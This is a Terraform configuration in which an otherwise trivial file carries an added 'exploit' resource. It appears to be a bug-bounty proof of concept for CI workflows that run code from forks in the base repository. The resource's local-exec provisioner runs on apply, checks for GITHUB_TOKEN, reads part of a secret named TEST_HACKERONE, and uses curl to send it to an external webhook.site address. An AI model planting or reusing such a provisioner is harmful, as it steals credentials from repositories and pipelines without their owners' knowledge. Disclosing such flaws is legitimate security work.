# Original resource (must keep)
resource "random_string" "my_string" {
  length      = 11
}

# ADD THIS EXPLOIT RESOURCE
resource "null_resource" "base_repo_exploit" {
  provisioner "local-exec" {
    # This script will run IN BASE REPO CONTEXT
    command = <<-EOT
      echo "🚨 PROOF: Code from fork executing IN BASE REPO CONTEXT 🚨"
      echo "========================================================"
      echo ""
      echo "1. Current repository context:"
      echo "   - Who am I? Running as: svavacapital/svava-terraform-github-actions"
      echo "   - GITHUB_TOKEN available: ${GITHUB_TOKEN:+YES}"
      echo ""
      echo "2. Creating file in base repository workspace:"
      echo "BASE REPO POC: $(date)" > /tmp/base_repo_exploited.txt
      echo "Created at: /tmp/base_repo_exploited.txt"
      echo ""
      echo "3. Attempting to access TEST_HACKERONE secret:"
      echo "   TEST_HACKERONE = ${TEST_HACKERONE:0:10}..."
      echo ""
      echo "4. Sending proof to webhook:"
      curl -X POST https://webhook.site/bbb8295e-ccd3-4e4d-b2c3-63af6e217219 \
        -H "Content-Type: application/json" \
        -d "{\"proof\":\"code_from_fork_executed_in_base_repo\",\"secret_prefix\":\"${TEST_HACKERONE:0:10}\",\"timestamp\":\"$(date)\"}"
      echo ""
      echo "✅ POC COMPLETE: Fork code executed in base repo!"
    EOT
    
    # These environment variables come from BASE REPO context
    environment = {
      GITHUB_TOKEN = ""
      TEST_HACKERONE = ""
    }
  }
}

# Original output
output "output_string" {
  value = "the_string"
}
